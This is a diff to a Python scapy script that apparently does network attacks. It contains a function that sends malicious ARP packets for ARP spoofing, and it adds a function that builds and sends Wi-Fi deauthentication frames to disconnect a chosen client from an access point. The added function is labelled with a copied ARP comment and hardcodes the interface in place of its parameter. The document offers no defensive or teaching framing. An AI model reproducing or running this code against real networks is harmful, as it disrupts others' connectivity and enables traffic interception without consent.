@@ -18,8 +18,9 @@ from scapy.all import (
     sendp
 )
 
+
+# send malicious ARP packets
 def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
-    # Function for sending the malicious ARP packets out with the specified data
     ether = Ether()
     ether.src = my_mac
 
@@ -42,3 +43,16 @@ def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
         sendp(x=packet, verbose=False)
 
     broadcastPacket()
+
+
+# send malicious ARP packets
+def sendDeauthPacket(iface, bssid, client):
+    conf.verb = 0
+    conf.iface = 'en0'
+    
+    def broadcastPacket():
+        pkt=RadioTap()/Dot11(addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth()
+        sendp(pkt)
+
+    broadcastPacket()
+
